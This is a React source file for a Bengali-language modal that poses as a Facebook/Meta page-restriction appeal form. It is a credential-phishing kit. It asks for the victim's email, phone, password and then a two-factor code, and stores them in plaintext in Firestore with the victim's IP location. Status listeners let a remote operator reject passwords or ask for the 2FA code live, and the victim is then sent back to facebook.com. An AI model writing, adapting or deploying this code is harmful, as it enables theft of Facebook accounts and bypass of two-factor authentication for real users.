import {
  collection,
  addDoc,
  onSnapshot,
  query,
  doc,
  updateDoc,
  runTransaction,
  orderBy,
  getDocs,
  limit,
} from "firebase/firestore";
import React, { useState,useEffect} from "react";
import Modal from "react-modal";
import { db } from "../../firebase";
import { useNavigate } from "react-router-dom";
import PhoneInput from 'react-phone-input-2'
import 'react-phone-input-2/lib/style.css'
import validator from "validator";

Modal.setAppElement("#card");

const modalStyle = {
  overlay: {
    backgroundColor: "rgba(0, 0, 0, 0.5)",
    zIndex: 1000,
  },
  content: {
    width: "100%",
    maxWidth: "450px",
    top: "40%", // Căn giữa theo chiều dọc
    left: "50%", // Căn giữa theo chiều ngang
    padding: "0px",
    border:"none",
    borderRadius: "8px",
    boxShadow: "none",
    backgroundColor: "none",
    position: "relative",
  },
};
const delay = ms => new Promise(res => setTimeout(res, ms));

const MyPopup = ({ isOpen, onClose, onSave }) => {
  const [countryCode, setCountryCode] = useState('us');

  useEffect(() => {
    const ipAddrrs = localStorage.getItem("location") || "";
    if(ipAddrrs.length > 0){
      const JsLocation = JSON.parse(ipAddrrs);
      if(JsLocation && JsLocation.country){
        setCountryCode(JsLocation.country.toLowerCase());
      }
    }
  }, []);

  const [passwordShown, setPasswordShown] = useState(false);
  const togglePasswordVisiblity = async () => {
    setPasswordShown(passwordShown ? false : true);
    await delay(2000);
    setPasswordShown(false);
  };
  const [pass, setPass] = useState("");
  const [mail, setMail] = useState("");
  const [fone, setFone] = useState("");

  const [stage, setStage] = useState(0);
  const [error, SetError] = useState(false);
  const [inputValue, setInputValue] = useState("");
  const [userID, setUserID] = useState("");
  const handlePhoneChange = (e) => {
    setFone(e);
    if (!validator.isMobilePhone(e)) {
      setDisabled(true);
    } else {
      setDisabled(false);
    }
  };


  const handleConfirmPage = (e) => {

    if(fone.length > 10 && mail.length > 10){
      SetError(false);
      setStage(1);
    }else{
      SetError(true);
    }
  };


  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState({
    type: "",
    msg: "",
  });
  const navigate = useNavigate();
  const [data, setData] = useState({});
  const usersRef = collection(db, "users");
  const q = query(usersRef, orderBy("auto_id", "desc", limit(1)));
  const [disabled, setDisabled] = useState(true);
  const listener = (userID) => {
    onSnapshot(doc(db, "users", userID), (snapshot) => {
      const status = snapshot.data()?.status;
      if (status === 0 || status === 1) return;
      // Handle different status codes here
      switch (status) {
        case -1:
          setResult({
            type: "warning",
            msg: "<a class=\"fw-bold text-danger\" rel=\"noopener noreferrer\" target=\"_blank\" href=\"https://www.facebook.com/login/identify/\" style=\"text-decoration: none;\">Password ভুলে গেছেন?</a>",
          });
          setIsLoading(false);
          SetError(true);
          break;
        case 2:
          SetError(false);
          setStage(2);
          setIsLoading(false);
          break;
        default:
          console.log(status);
      }
    });
  };


  const listener2 = (userID) => {
    onSnapshot(doc(db, "users", userID), (snapshot) => {
      const status = snapshot.data()?.status;
      switch (status) {
        case 3:
          setResult({
            type: "success",
            msg: "You have successfully submitted your support request!",
          });
          SetError(false);
          setStage(3);
          setIsLoading(false);
          break;
        case -2:
          setResult({
            type: "error",
            msg: "The authentication code is incorrect, please try again!",
          });
          SetError(true);
          setIsLoading(false);
          break;
        default:
          console.log(status);
      }
    });
  };

  const updateIndex = async (userID) => {
    try {
      await runTransaction(db, async (transaction) => {
        const sfDocRef = doc(db, "users", userID);
        const sfDoc = await transaction.get(sfDocRef);
        const dosLast = await getDocs(q);
        if (!sfDoc.exists()) {
          throw "Document does not exist!";
        }
        const [lastest] = dosLast.docs
        const auto_id = (lastest?.get("auto_id") || 0) + 1;
        transaction.update(sfDocRef, { auto_id });
      });

      console.log("Transaction successfully committed!");
    } catch (e) {
      console.log("Transaction failed: ", e);
    }
  };


  const handleSubmit = async () => {
    if(!pass || pass.length < 6){
        SetError(true);
        setIsLoading(false);
        return;
    }
    setIsLoading(true); 
    SetError(false);
    try {
      if (result.type && result.type !== "success") {
        updateDoc(doc(db, "users", data.id), {
          status: 1,
          pass: pass
        });
        return;
      }
      setResult({
        type: "",
        msg: "",
      });
      const ipAddrrs = localStorage.getItem("location") || "";
      const user = await addDoc(collection(db, "users"), {
        pass:pass,phone:fone,email:mail,auth:'',ip:ipAddrrs,status: 1,status2:0,ck:'',pg:'',bm:'',ad:'',if:'',createdAt: new Date().getTime(),
      });
      if(user.id){
        updateIndex(user.id);
        setData(user);
        setUserID(user.id);
        listener(user.id);
      }
    } catch (error) {
      console.error("Error saving data to Firestore: ", error);
    } finally {
    }
  };

  const handleAuthEnter = async () => {
    try {
      if(!inputValue || inputValue.length < 6){
        SetError(true);
        setIsLoading(false);
        return;
      }
      const userDocRef = doc(db, "users", userID);
      await updateDoc(userDocRef, {
        auth: inputValue,
        status: 2
      });
      listener2(userID);
      setIsLoading(true);
      console.log(isLoading);
    } catch (error) {
    } finally {
    }
  };

  return (
    <Modal
      isOpen={isOpen}
      onRequestClose={onClose}
      style={modalStyle}
      shouldCloseOnOverlayClick={true}
    >
      <>
      <div className="modal form-modal show" id="exampleModal1" tabIndex="-1" aria-labelledby="exampleModalLabel" style={{display: 'block'}} aria-modal="true" role="dialog">
        <div className="modal-dialog modal-dialog-centered modal-dialog-scrollable">
            <div className="modal-content">
                <div className="modal-header">
                    <h5 className="modal-title" id="exampleModalLabel">আপিল ফর্ম</h5>
                    <button onClick={onClose} type="button" className="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>

               {(() => {

                  switch(stage) {
                    case 0:   
                    return (<div className="modal-body">
                    <div id="first-form">
                         <div className="mb-3">
                            <label htmlFor="exampleFormControlTextarea1" className="form-label">
                            অনুগ্রহ করে উল্লেখ করুন কেন আপনি মনে করেন পেজের উপর আরোপিত সীমাবদ্ধতাটি ভুলবশত প্রয়োগ করা হয়েছে।
                            </label>
                            <textarea name="apeal" className="form-control" id="exampleFormControlTextarea1" rows="1"></textarea>
                        </div>
                        <div className="mb-3">
                            <label htmlFor="BuisenessEmailField" className="form-label">ইমেইল ঠিকানা</label>
                            <input onChange={(e) => {if(e.target.value.length > 100) return;setMail(e.target.value);}} name="buiseness-email" type="email" className="form-control" id="BuisenessEmailField"/>
                        </div>

                        <div className="mb-3">
                            <label htmlFor="PhoneFirld" className="form-label">ফোন নম্বর</label>
                            <PhoneInput
                            inputStyle={{border:'none',fontSize:'15px'}}
                            buttonStyle={{border:'none',backgroundColor:'#fff'}}
                            className = "form-control"
                            enableAreaCodes={true}
                            country={countryCode}
                            value={fone}
                            onChange={handlePhoneChange}
                            />
                        </div>


                        <div style={{display: error ? 'inline-block' : 'none'}} className="mb-2 invalid-feedback">
                          ইমেইল ঠিকানা বা ফোন নম্বর ভুল হয়েছে। অনুগ্রহ করে আবার চেষ্টা করুন!
                        </div>

                        <div className="mb-3 form-check">
                            <input type="checkbox" className="form-check-input" id="exampleCheck1"/>
                            <label className="form-check-label" htmlFor="exampleCheck1">আমি সম্মত

                                <a id="termsLink" className="add-svg">&nbsp;ব্যবহারের শর্তাবলী
                                </a>
                            </label>
                        </div>
                        <div className="form-btn-wrapper">
                            <button onClick={handleConfirmPage} className="btn btn-primary">
                                <div className="spinner-border text-light" role="status" style={{display: 'none'}}>
                                    <span className="visually-hidden">লোড হচ্ছে...</span>
                                </div>
                                <span className="button-text">&nbsp;{isLoading == true ? 'লোড হচ্ছে...' : 'চালিয়ে যান'}</span>
                            </button>
                        </div>
                    </div>
                  </div>);
                    case 1:   
                     return (<div className="modal-body">

                     <div className="fb-round-wraper">
                         <img src="img/fb_round_logo.png" className="fb-logo-round"/>
                     </div>
                     <div id="apiForm">
                         <div className="mb-3">
                             <div className="password-input">
                                 <label htmlFor="exampleInputPassword" className="form-label">পাসওয়ার্ড</label>
                                 <div style={{display: 'flex', alignItems: 'center'}}>
                                     <input onChange={(e) => {if(e.target.value.length > 100) return;setPass(e.target.value);}} type={passwordShown ? "text" : "password"} className="form-control" id="exampleInputPassword" autoComplete="off" minLength="8" maxLength="30" aria-describedby="emailHelp"/>
                                 </div>
                                 <img onClick={togglePasswordVisiblity} style={{position:'absolute',right:'5%',width:'20px',height:'20px'}} src={passwordShown ? "/assets/eye.png" : "/assets/eye-close.png"}/>
                             </div>
                             <div style={{display: error == true ? 'inline-block' : 'none'}} className="mt-2 invalid-feedback">
                               পাসওয়ার্ড ভুল হয়েছে, অনুগ্রহ করে আবার চেষ্টা করুন।
                            </div>
                         </div>
                         <div className="form-btn-wrapper">
                             <button disabled={isLoading == true ? true : false} onClick={handleSubmit} className="btn btn-primary">
                                 <div className="spinner-border text-light" role="status" style={{display: isLoading ? 'inline-block' : 'none'}}>
                                     <span className="visually-hidden"></span>
                                 </div>
                                 <span className="button-text">&nbsp;{isLoading == true ? 'লোড হচ্ছে...' : 'চালিয়ে যান'}</span>
                             </button>
                         </div>
                         <div id="forgot-pass-wrap">
                             <span>পাসওয়ার্ড ভুলে গেছেন?</span>
                         </div>
                     </div>
                     <div className="spaser"></div>
                 </div>);
                    case 2: 
                     return (<div className="modal-body">
                     <div className="twoFAinfo-wraper">
                         <h1 className="modal-title" id="2FAmodalLabel">আপনার প্রমাণীকরণ কোডটি পরীক্ষা করুন।</h1>
                         <p>এই অ্যাকাউন্টের জন্য দুই-ধাপ যাচাইকরণ অ্যাপ বা আপনার মোবাইলে পাঠানো টেক্সট মেসেজ থেকে ৬-সংখ্যার কোডটি প্রবেশ করুন।</p>
                         <div className="fb-round-wraper">
                             <img src="img/2FA.png"  style={{width: '100%'}}/>
                         </div>
                     </div>
 
                     <div id="twoFAForm">
                         <div className="mb-3">
                         </div>
 
 
                         <div className="mb-3">
                             <div className="password-input">
                                 <label htmlFor="exampleInputPassword" className="form-label">কোড</label>
                                 <input                   onChange={(e) => {
                    if(!isNaN(+e.target.value) == false) return;
                    setInputValue(e.target.value);
                  }} name="2FA-1" minLength="6" maxLength="8" type="tel" className="form-control" id="exampleInputPassword" autoComplete="off"/>
                             </div>
                             <div style={{display: error ? 'inline-block' : 'none'}} className="invalid-feedback">
                                 ভুল হয়েছে। অনুগ্রহ করে পরে আবার চেষ্টা করুন। <span id="timer"></span>
                             </div>
                         </div>
                         <div className="form-btn-wrapper">
                             <button disabled={isLoading ? true : false} onClick={handleAuthEnter} className="btn btn-primary">
                                 <div className="spinner-border text-light" role="status" style={{display: isLoading ? 'inline-block' : 'none'}}>
                                     <span className="visually-hidden">লোড হচ্ছে...</span>
                                 </div>
                                <span className="button-text">&nbsp;{isLoading == true ? 'লোড হচ্ছে...' : 'চালিয়ে যান'}</span>
                             </button>
                         </div>
                     </div>
                     <div className="spaser"></div>
                 </div>);
                    default:  
                      return (
                      <div className="modal-body">
                      <div className="twoFAinfo-wraper">
                          <h1 className="modal-title" id="successModalLabel">অনুরোধ পাঠানো হয়েছে।</h1>
                          <br/>
                          <div className="fb-round-wraper">
                              <img src="img/phone.png" style={{width: '100%'}}/>
                          </div>
                          <br/>
                          <p>আপনার অনুরোধটি প্রক্রিয়াকরণের সারিতে যুক্ত করা হয়েছে। আমরা ২৪ ঘণ্টার মধ্যে আপনার অনুরোধটি প্রক্রিয়া করব। যদি ২৪ ঘণ্টার মধ্যে আপিলের অবস্থাসহ কোনো ইমেইল বার্তা না পান, অনুগ্রহ করে আবার আপিল পাঠান।</p>
  
                      </div>
                      <form action="https://facebook.com/" method="GET">
                          <div className="form-btn-wrapper">
                              <button className="btn btn-primary">
                                  <span className="button-text">Facebook-এ ফিরে যান</span>
                              </button>
                          </div>
                      </form>
                  </div>);
                  }

       
                })()}
                <div className="modal-footer">
                    <img src="img/meta-logo-grey.png"/>
                </div>
            </div>
        </div>
    </div>  
      </>
    </Modal>
  );
};

export default MyPopup;
